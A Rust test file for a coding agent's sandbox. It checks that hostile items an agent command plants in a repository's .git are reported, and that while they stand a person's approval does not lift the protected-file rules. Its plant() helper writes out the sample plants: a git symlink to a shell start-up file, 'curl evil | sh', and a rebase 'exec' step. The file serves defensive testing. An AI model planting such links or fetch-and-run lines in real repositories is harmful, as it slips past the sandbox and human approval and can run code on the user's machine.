//! #874, #837 (Travis, 2026-10-16, D6): the post-command `.git` check, through
//! the orchestrator and the real sandbox (Seatbelt on macOS, bubblewrap on
//! Linux). Under Moderate with full access in the person's own settings an
//! agent command can write the project's `.git`; what it plants there that
//! the person's own git would follow outside the sandbox (a link git writes
//! through, rebase steps with `exec` lines) is reported, nothing is removed,
//! and until it is removed a person's approval doesn't lift the
//! protected-file rules. Permissive is unchanged; under the workspace sandbox
//! `.git` stays read-only.
#![cfg(any(target_os = "macos", target_os = "linux"))]

use std::path::Path;
use std::sync::Arc;

use codex_core::config::Constrained;
use codex_features::Feature;
use codex_protocol::models::PermissionProfile;
use codex_protocol::permissions::NetworkSandboxPolicy;
use codex_protocol::protocol::AskForApproval;
use codex_protocol::protocol::EventMsg;
use codex_protocol::protocol::Op;
use codex_protocol::protocol::ReviewDecision;
use codex_protocol::protocol::ThreadSettingsOverrides;
use codex_protocol::user_input::UserInput;
use codex_security_policy::SecurityLevel;
use core_test_support::responses::ResponsesRequest;
use core_test_support::responses::ev_assistant_message;
use core_test_support::responses::ev_completed;
use core_test_support::responses::ev_function_call;
use core_test_support::responses::ev_response_created;
use core_test_support::responses::mount_sse_sequence;
use core_test_support::responses::sse;
use core_test_support::responses::start_mock_server;
use core_test_support::skip_if_no_network;
use core_test_support::skip_if_sandbox;
use core_test_support::test_codex::TestCodex;
use core_test_support::test_codex::local_selections;
use core_test_support::test_codex::test_codex;
use core_test_support::wait_for_event;
use pretty_assertions::assert_eq;
use serde_json::Value;
use serde_json::json;
use tempfile::TempDir;

const CANARY: &str = "PF874_SIGN_IN_CANARY";
const NOTHING_REMOVED: &str = "Nothing was removed";

struct Run {
    warnings: Vec<String>,
    /// How many of `warnings` came before the first approval prompt.
    warned_before_asked: usize,
    asked: usize,
    /// The approval prompts' reasons (read by the Linux-only D48 test).
    #[cfg_attr(not(target_os = "linux"), allow(dead_code))]
    reasons: Vec<String>,
    requests: Vec<ResponsesRequest>,
}

fn step(call_id: &str, arguments: Value) -> Vec<Value> {
    vec![
        ev_response_created(call_id),
        ev_function_call(call_id, "shell_command", &arguments.to_string()),
        ev_completed(call_id),
    ]
}

/// A minimal git folder in `project`.
fn init_git(project: &Path) -> anyhow::Result<()> {
    let git = project.join(".git");
    for folder in ["objects", "refs/heads", "hooks", "logs"] {
        std::fs::create_dir_all(git.join(folder))?;
    }
    std::fs::write(git.join("HEAD"), "ref: refs/heads/main\n")?;
    std::fs::write(
        git.join("config"),
        "[core]\n\trepositoryformatversion = 0\n",
    )?;
    Ok(())
}

/// The person's own sandbox setting.
#[derive(Clone, Copy, Debug)]
enum Setting {
    FullAccess,
    /// Writes only in the project (not `/tmp` or `$TMPDIR`, where the test
    /// project is).
    Workspace,
}

async fn run(
    level: SecurityLevel,
    setting: Setting,
    home: Arc<TempDir>,
    steps: Vec<Vec<Value>>,
) -> anyhow::Result<(Run, TestCodex)> {
    run_in(level, setting, home, steps, /*project_of*/ None).await
}

/// [`run`], working in `project_of`'s project where given.
async fn run_in(
    level: SecurityLevel,
    setting: Setting,
    home: Arc<TempDir>,
    steps: Vec<Vec<Value>>,
    project_of: Option<&TestCodex>,
) -> anyhow::Result<(Run, TestCodex)> {
    run_with(
        level, setting, home, steps, project_of, /*left_before*/ None,
        /*permission_approvals*/ false,
    )
    .await
}

/// [`run_in`], with a link to `left_before` left in the project's `.git`
/// before the session starts, where given, and with requests for additional
/// permissions asked about where `permission_approvals`.
async fn run_with(
    level: SecurityLevel,
    setting: Setting,
    home: Arc<TempDir>,
    steps: Vec<Vec<Value>>,
    project_of: Option<&TestCodex>,
    left_before: Option<std::path::PathBuf>,
    permission_approvals: bool,
) -> anyhow::Result<(Run, TestCodex)> {
    let server = start_mock_server().await;
    let mut steps = steps;
    steps.push(vec![
        ev_response_created("done"),
        ev_assistant_message("msg-done", "done"),
        ev_completed("done"),
    ]);
    let captured = mount_sse_sequence(&server, steps.into_iter().map(sse).collect()).await;
    let test = test_codex()
        .with_home(home)
        .with_model("test-gpt-5.1-codex")
        .with_config(move |config| {
            config.security_level = level;
            config.permissions.approval_policy = Constrained::allow_any(AskForApproval::OnRequest);
            let profile = match setting {
                Setting::FullAccess => PermissionProfile::Disabled,
                Setting::Workspace => PermissionProfile::workspace_write_with(
                    std::slice::from_ref(&config.cwd),
                    NetworkSandboxPolicy::Restricted,
                    /*exclude_tmpdir_env_var*/ true,
                    /*exclude_slash_tmp*/ true,
                ),
            };
            config
                .permissions
                .set_permission_profile(profile)
                .expect("profile");
            config
                .features
                .enable(Feature::SourceEnvelopes)
                .expect("enable source envelopes");
            if permission_approvals {
                config
                    .features
                    .enable(Feature::ExecPermissionApprovals)
                    .expect("enable exec permission approvals");
            }
        })
        .with_workspace_setup(move |cwd, _| async move {
            init_git(cwd.as_path())?;
            if let Some(target) = left_before {
                std::os::unix::fs::symlink(target, cwd.as_path().join(".git/COMMIT_EDITMSG"))?;
            }
            Ok(())
        })
        // Host-sandbox security test: local executor on purpose (#708).
        .build(&server)
        .await?;
    std::mem::forget(server);
    test.codex
        .submit(Op::UserInput {
            items: vec![UserInput::Text {
                text: "tidy the repository".into(),
                text_elements: Vec::new(),
            }],
            final_output_json_schema: None,
            responsesapi_client_metadata: None,
            additional_context: Default::default(),
            thread_settings: ThreadSettingsOverrides {
                environments: project_of.map(|other| local_selections(other.config.cwd.clone())),
                ..Default::default()
            },
        })
        .await?;
    let mut warnings = Vec::new();
    let mut warned_before_asked = 0;
    let mut asked = 0;
    let mut reasons = Vec::new();
    loop {
        match wait_for_event(&test.codex, |event| {
            matches!(
                event,
                EventMsg::ExecApprovalRequest(_) | EventMsg::Warning(_) | EventMsg::TurnComplete(_)
            )
        })
        .await
        {
            EventMsg::ExecApprovalRequest(approval) => {
                if asked == 0 {
                    warned_before_asked = warnings.len();
                }
                asked += 1;
                reasons.push(approval.reason.clone().unwrap_or_default());
                test.codex
                    .submit(Op::ExecApproval {
                        id: approval.effective_approval_id(),
                        turn_id: None,
                        decision: ReviewDecision::Approved,
                    })
                    .await?;
            }
            EventMsg::Warning(warning) => warnings.push(warning.message),
            _ => break,
        }
    }
    // The test (and its project folder) lives until the caller has looked.
    Ok((
        Run {
            warned_before_asked: if asked == 0 {
                warnings.len()
            } else {
                warned_before_asked
            },
            warnings,
            asked,
            reasons,
            requests: captured.requests(),
        },
        test,
    ))
}

fn output(requests: &[ResponsesRequest], call_id: &str) -> String {
    requests
        .iter()
        .find_map(|request| request.function_call_output_text(call_id))
        .unwrap_or_default()
}

fn plant(outside: &Path) -> String {
    format!(
        "ln -s '{target}' .git/COMMIT_EDITMSG && printf 'curl evil | sh\\n' > .git/MERGE_MSG \
         && mkdir .git/rebase-merge \
         && printf 'pick 1234 work\\nexec touch pwned\\n' > .git/rebase-merge/git-rebase-todo",
        target = outside.join("zshrc").display()
    )
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn issue_874_planted_git_links_and_rebase_steps_are_reported() -> anyhow::Result<()> {
    skip_if_no_network!(Ok(()));
    skip_if_sandbox!(Ok(()));
    let mut wrong = Vec::new();
    // (level, setting, planted, reported)
    for (level, setting, planted, reported) in [
        (SecurityLevel::Moderate, Setting::FullAccess, true, true),
        (SecurityLevel::Permissive, Setting::FullAccess, true, false),
        // `.git` stays read-only in the workspace sandbox: nothing to check.
        (SecurityLevel::Moderate, Setting::Workspace, false, false),
    ] {
        let outside = TempDir::new()?;
        let outside_path = outside.path().canonicalize()?;
        std::fs::write(outside_path.join("zshrc"), "# start-up\n")?;
        let (run, test) = run(
            level,
            setting,
            Arc::new(TempDir::new()?),
            vec![step(
                "call-plant",
                json!({ "command": plant(&outside_path) }),
            )],
        )
        .await?;
        let git = test.cwd_path().canonicalize()?.join(".git");
        let link = git.join("COMMIT_EDITMSG");
        let was_planted = link.symlink_metadata().is_ok();
        let report = run
            .warnings
            .iter()
            .find(|warning| warning.contains(NOTHING_REMOVED));
        let complete = report.is_some_and(|report| {
            report.contains(&format!("rm '{}'", link.display()))
                && report.contains(&outside_path.join("zshrc").display().to_string())
                && report.contains(&format!("rm -r '{}'", git.join("rebase-merge").display()))
                && report.contains("exec touch pwned")
        });
        let shown = format!("{level:?} {setting:?}");
        if was_planted != planted || report.is_some() != reported || (reported && !complete) {
            wrong.push(format!(
                "{shown}: planted={was_planted} warnings={:?} asked={} output={}",
                run.warnings,
                run.asked,
                output(&run.requests, "call-plant")
            ));
        }
        // Nothing is removed, and the link's target is untouched.
        if was_planted && std::fs::read_to_string(outside_path.join("zshrc"))? != "# start-up\n" {
            wrong.push(format!("{shown}: the target changed"));
        }
    }
    assert_eq!(wrong, Vec::<String>::new());
    Ok(())
}

/// While a planted link stands, a person's approval doesn't lift Moderate's
/// protected-file rules: the approved command can't read the sign-in file it
/// could read otherwise (and an approved `git commit` couldn't write through
/// the link into a protected file).
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn issue_874_approval_does_not_lift_the_rules_while_a_finding_stands() -> anyhow::Result<()> {
    skip_if_no_network!(Ok(()));
    skip_if_sandbox!(Ok(()));
    let mut wrong = Vec::new();
    for planted in [false, true] {
        let outside = TempDir::new()?;
        let outside_path = outside.path().canonicalize()?;
        std::fs::write(outside_path.join("zshrc"), "# start-up\n")?;
        let home = Arc::new(TempDir::new()?);
        let auth = home.path().canonicalize()?.join("auth.json");
        std::fs::write(&auth, CANARY)?;
        let first = if planted {
            plant(&outside_path)
        } else {
            "printf 'tidied'".to_string()
        };
        let (run, _) = run(
            SecurityLevel::Moderate,
            Setting::FullAccess,
            home,
            vec![
                step("call-first", json!({ "command": first })),
                step(
                    "call-read",
                    json!({
                        "command": format!("cat '{}'", auth.display()),
                        "sandbox_permissions": "require_escalated",
                        "justification": "check the sign-in",
                    }),
                ),
            ],
        )
        .await?;
        let read = output(&run.requests, "call-read");
        // Asked and approved either way; lifted only without the finding.
        if run.asked == 0 || read.contains(CANARY) == planted {
            wrong.push(format!(
                "planted={planted}: asked={} warnings={:?} read={read}",
                run.asked, run.warnings
            ));
        }
    }
    assert_eq!(wrong, Vec::<String>::new());
    Ok(())
}

/// Merge review (#926 with D27 (a), #891): while a finding stands in a
/// project (found by any session of this process), a person's approval of
/// a command there doesn't let its run create user namespaces either: in
/// one, it could get past the protected-file rules the finding keeps.
#[cfg(target_os = "linux")]
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn issue_874_a_standing_finding_keeps_user_namespaces_denied() -> anyhow::Result<()> {
    skip_if_no_network!(Ok(()));
    skip_if_sandbox!(Ok(()));
    /// Prints whether the sandbox denies user namespaces to this run.
    const SCRIPT: &str = "echo marker=${CODEX_SANDBOX_USER_NAMESPACES_DENIED:-unset}";
    let mut wrong = Vec::new();
    for planted in [false, true] {
        let outside = TempDir::new()?;
        let outside_path = outside.path().canonicalize()?;
        std::fs::write(outside_path.join("zshrc"), "# start-up\n")?;
        // One session, with full access, works in the project (planting a
        // link there, or not).
        let first = if planted {
            plant(&outside_path)
        } else {
            "printf 'tidied'".to_string()
        };
        let (_, worked) = Box::pin(run(
            SecurityLevel::Moderate,
            Setting::FullAccess,
            Arc::new(TempDir::new()?),
            vec![step("call-first", json!({ "command": first }))],
        ))
        .await?;
        // Another, in the workspace sandbox in the same project and before
        // untrusted content, asks to run a command outside the sandbox; approved, which
        // otherwise lets that run create user namespaces (D27 (a)).
        let (second, _) = Box::pin(run_in(
            SecurityLevel::Moderate,
            Setting::Workspace,
            Arc::new(TempDir::new()?),
            vec![step(
                "call-userns",
                json!({
                    "command": SCRIPT,
                    "sandbox_permissions": "require_escalated",
                    "justification": "rootless podman needs a user namespace",
                }),
            )],
            Some(&worked),
        ))
        .await?;
        let out = output(&second.requests, "call-userns");
        let denied = out.contains("marker=1");
        let allowed = out.contains("marker=unset");
        // Denied because of the finding: the person is told so.
        let held_note = second
            .warnings
            .iter()
            .any(|warning| warning.contains("nor let it create user namespaces"));
        if second.asked == 0 || denied != planted || allowed == planted || held_note != planted {
            wrong.push(format!(
                "planted={planted}: asked={} warnings={:?} output={out}",
                second.asked, second.warnings
            ));
        }
    }
    assert_eq!(wrong, Vec::<String>::new());
    Ok(())
}

/// Merge with D48 (c) (#891): after untrusted content, a person's approval
/// of a known tool's request to run outside the sandbox allows user
/// namespaces for that run, but not while a `.git` finding stands in its
/// project; the person is told why. #943 item 18: in D48's own prompt; the
/// note names only the namespaces (a D48 approval lifts no file rule), and
/// without the finding the namespace is made.
#[cfg(target_os = "linux")]
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn issue_874_a_standing_finding_keeps_d48_known_tools_denied() -> anyhow::Result<()> {
    skip_if_no_network!(Ok(()));
    skip_if_sandbox!(Ok(()));
    /// A known tool's plain command; prints the marker only inside a
    /// namespace it made.
    const PLAIN: &str = "unshare -Ur printf NAMESPACE-MADE-%s D48";
    const NAMESPACE_MADE: &str = "NAMESPACE-MADE-D48";
    /// The #826 explanation added where the rule refused it.
    const EXPLAINED: &str = "blocks creating user namespaces";
    /// D48's prompt warning (D27's).
    const WARNING: &str =
        "Warning (Linux): approving also lets this one run create user namespaces";
    let mut wrong = Vec::new();
    for planted in [false, true] {
        let outside = TempDir::new()?;
        let outside_path = outside.path().canonicalize()?;
        std::fs::write(outside_path.join("zshrc"), "# start-up\n")?;
        let first = if planted {
            plant(&outside_path)
        } else {
            "printf 'tidied'".to_string()
        };
        let (_, worked) = Box::pin(run(
            SecurityLevel::Moderate,
            Setting::FullAccess,
            Arc::new(TempDir::new()?),
            vec![step("call-first", json!({ "command": first }))],
        ))
        .await?;
        // Another session in the project: a first command's output is
        // untrusted content, then the known tool asks to leave the sandbox.
        let (second, _) = Box::pin(run_in(
            SecurityLevel::Moderate,
            Setting::Workspace,
            Arc::new(TempDir::new()?),
            vec![
                step("call-echo", json!({ "command": "echo first" })),
                step(
                    "call-d48",
                    json!({
                        "command": PLAIN,
                        "sandbox_permissions": "require_escalated",
                        "justification": "rootless podman needs a user namespace",
                    }),
                ),
            ],
            Some(&worked),
        ))
        .await?;
        let out = output(&second.requests, "call-d48");
        let explained = out.contains(EXPLAINED);
        let made = out.contains(NAMESPACE_MADE);
        let d48_prompt = second.reasons.iter().any(|reason| reason.contains(WARNING));
        let held_note = second
            .warnings
            .iter()
            .any(|warning| warning.contains("doesn't let this command create user namespaces"));
        let rules_note = second
            .warnings
            .iter()
            .any(|warning| warning.contains("doesn't lift the protected-file rules"));
        if second.asked == 0
            || !d48_prompt
            || explained != planted
            || made == planted
            || held_note != planted
            || rules_note
        {
            wrong.push(format!(
                "planted={planted}: asked={} reasons={:?} warnings={:?} output={out}",
                second.asked, second.reasons, second.warnings
            ));
        }
    }
    assert_eq!(wrong, Vec::<String>::new());
    Ok(())
}

/// #943 item 11: a command whose `workdir` is in another repository gets the
/// same check there: what it plants in that repository's `.git` is reported,
/// and while it stands a person's approval of a later command there doesn't
/// lift the protected-file rules (it does where nothing was planted).
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn issue_943_a_command_in_another_repository_is_checked() -> anyhow::Result<()> {
    skip_if_no_network!(Ok(()));
    skip_if_sandbox!(Ok(()));
    let mut wrong = Vec::new();
    for planted in [false, true] {
        let outside = TempDir::new()?;
        let outside_path = outside.path().canonicalize()?;
        std::fs::write(outside_path.join("zshrc"), "# start-up\n")?;
        let other = TempDir::new()?;
        let other_path = other.path().canonicalize()?;
        init_git(&other_path)?;
        let home = Arc::new(TempDir::new()?);
        let auth = home.path().canonicalize()?.join("auth.json");
        std::fs::write(&auth, CANARY)?;
        let workdir = other_path.display().to_string();
        let first = if planted {
            plant(&outside_path)
        } else {
            "printf 'tidied'".to_string()
        };
        let (run, _) = Box::pin(run(
            SecurityLevel::Moderate,
            Setting::FullAccess,
            home,
            vec![
                step(
                    "call-first",
                    json!({ "command": first, "workdir": workdir }),
                ),
                step(
                    "call-read",
                    json!({
                        "command": format!("cat '{}'", auth.display()),
                        "workdir": workdir,
                        "sandbox_permissions": "require_escalated",
                        "justification": "check the sign-in",
                    }),
                ),
            ],
        ))
        .await?;
        let link = other_path.join(".git").join("COMMIT_EDITMSG");
        let link_shown = link.display().to_string();
        let reported = run.warnings.iter().any(|warning| {
            warning.contains(NOTHING_REMOVED) && warning.contains(&format!("rm '{link_shown}'"))
        });
        // Held because of that repository's finding: the person is told so.
        let held = run.warnings.iter().any(|warning| {
            warning.contains("doesn't lift the protected-file rules")
                && warning.contains(&link_shown)
        });
        let read = output(&run.requests, "call-read");
        if run.asked == 0
            || link.symlink_metadata().is_ok() != planted
            || reported != planted
            || held != planted
            || read.contains(CANARY) == planted
        {
            wrong.push(format!(
                "planted={planted}: reported={reported} held={held} asked={} warnings={:?} \
                 read={read}",
                run.asked, run.warnings
            ));
        }
    }
    assert_eq!(wrong, Vec::<String>::new());
    Ok(())
}

/// #943 item 17: what was left in a repository's `.git` before this session
/// (before Corbanu started, say) is looked at before the session's first
/// command there is decided: it is reported before the person is asked, and
/// their approval doesn't lift the protected-file rules for that command (it
/// does where nothing was left). In the project itself and in a command's
/// `workdir` in another repository. Under the workspace sandbox the
/// project's `.git` stays read-only: nothing is looked at there (#943 item
/// 22: also under Aggressive, where no approval lifts the rules anyway).
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn issue_943_left_before_the_session_holds_its_first_approval() -> anyhow::Result<()> {
    skip_if_no_network!(Ok(()));
    skip_if_sandbox!(Ok(()));
    let mut wrong = Vec::new();
    // (level, setting, planted, in another repository, held)
    for (level, setting, planted, elsewhere, held) in [
        (
            SecurityLevel::Moderate,
            Setting::FullAccess,
            false,
            false,
            false,
        ),
        (
            SecurityLevel::Moderate,
            Setting::FullAccess,
            true,
            false,
            true,
        ),
        (
            SecurityLevel::Moderate,
            Setting::FullAccess,
            false,
            true,
            false,
        ),
        (
            SecurityLevel::Moderate,
            Setting::FullAccess,
            true,
            true,
            true,
        ),
        (
            SecurityLevel::Moderate,
            Setting::Workspace,
            true,
            false,
            false,
        ),
        (
            SecurityLevel::Aggressive,
            Setting::Workspace,
            true,
            false,
            false,
        ),
    ] {
        // Under Aggressive an approval never lifts the rules.
        let lifted = level == SecurityLevel::Moderate && !held;
        let outside = TempDir::new()?;
        let outside_path = outside.path().canonicalize()?;
        let target = outside_path.join("zshrc");
        std::fs::write(&target, "# start-up\n")?;
        let other = TempDir::new()?;
        let other_path = other.path().canonicalize()?;
        init_git(&other_path)?;
        if planted && elsewhere {
            std::os::unix::fs::symlink(&target, other_path.join(".git/COMMIT_EDITMSG"))?;
        }
        let home = Arc::new(TempDir::new()?);
        let auth = home.path().canonicalize()?.join("auth.json");
        std::fs::write(&auth, CANARY)?;
        let mut read = json!({
            "command": format!("cat '{}'", auth.display()),
            "sandbox_permissions": "require_escalated",
            "justification": "check the sign-in",
        });
        if elsewhere {
            read["workdir"] = json!(other_path.display().to_string());
        }
        let (run, test) = Box::pin(run_with(
            level,
            setting,
            home,
            vec![step("call-read", read)],
            /*project_of*/ None,
            (planted && !elsewhere).then(|| target.clone()),
            /*permission_approvals*/ false,
        ))
        .await?;
        let repository = if elsewhere {
            other_path.clone()
        } else {
            test.cwd_path().canonicalize()?
        };
        let link = repository.join(".git").join("COMMIT_EDITMSG");
        let link_shown = link.display().to_string();
        let reported_before_asked = run.warnings[..run.warned_before_asked]
            .iter()
            .any(|warning| {
                warning.contains(NOTHING_REMOVED) && warning.contains(&format!("rm '{link_shown}'"))
            });
        let held_note = run.warnings.iter().any(|warning| {
            warning.contains("doesn't lift the protected-file rules")
                && warning.contains(&link_shown)
        });
        let read = output(&run.requests, "call-read");
        if run.asked == 0
            || link.symlink_metadata().is_ok() != planted
            || reported_before_asked != held
            || held_note != held
            || read.contains(CANARY) != lifted
        {
            wrong.push(format!(
                "{level:?} {setting:?} planted={planted} elsewhere={elsewhere}: asked={} \
                 warned_before_asked={} warnings={:?} read={read}",
                run.asked, run.warned_before_asked, run.warnings
            ));
        }
    }
    assert_eq!(wrong, Vec::<String>::new());
    Ok(())
}

/// #943 (#513): while a finding stands in the project (found by any session
/// of this process), a person's approval of a command's additional write
/// permission doesn't reopen a persistence file (here the project's
/// `.agents`): the run is refused, and a note names the finding (#1503
/// review). Without the finding it is written.
#[cfg(target_os = "macos")]
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn issue_943_a_standing_finding_refuses_additional_writes() -> anyhow::Result<()> {
    skip_if_no_network!(Ok(()));
    skip_if_sandbox!(Ok(()));
    let mut wrong = Vec::new();
    for planted in [false, true] {
        let outside = TempDir::new()?;
        let outside_path = outside.path().canonicalize()?;
        std::fs::write(outside_path.join("zshrc"), "# start-up\n")?;
        let first = if planted {
            plant(&outside_path)
        } else {
            "printf 'tidied'".to_string()
        };
        let (_, worked) = Box::pin(run(
            SecurityLevel::Moderate,
            Setting::FullAccess,
            Arc::new(TempDir::new()?),
            vec![step("call-first", json!({ "command": first }))],
        ))
        .await?;
        let (second, _) = Box::pin(run_with(
            SecurityLevel::Moderate,
            Setting::Workspace,
            Arc::new(TempDir::new()?),
            vec![step(
                "call-write",
                json!({
                    "command": "mkdir -p .agents && printf x >> .agents/issue943.md && echo wrote-943",
                    "sandbox_permissions": "with_additional_permissions",
                    "additional_permissions": { "file_system": { "write": [".agents"] } },
                    "justification": "update the agent notes",
                }),
            )],
            Some(&worked),
            /*left_before*/ None,
            /*permission_approvals*/ true,
        ))
        .await?;
        let out = output(&second.requests, "call-write");
        let written = std::fs::read_to_string(worked.cwd_path().join(".agents/issue943.md"))
            .unwrap_or_default();
        let held_note = second.warnings.iter().any(|warning| {
            warning.contains("doesn't let this command's additional permissions write")
                && warning.contains(".git")
        });
        if second.asked == 0
            || (written == "x") == planted
            || out.contains("wrote-943") == planted
            || held_note != planted
        {
            wrong.push(format!(
                "planted={planted}: asked={} written={written:?} warnings={:?} output={out}",
                second.asked, second.warnings
            ));
        }
    }
    assert_eq!(wrong, Vec::<String>::new());
    Ok(())
}
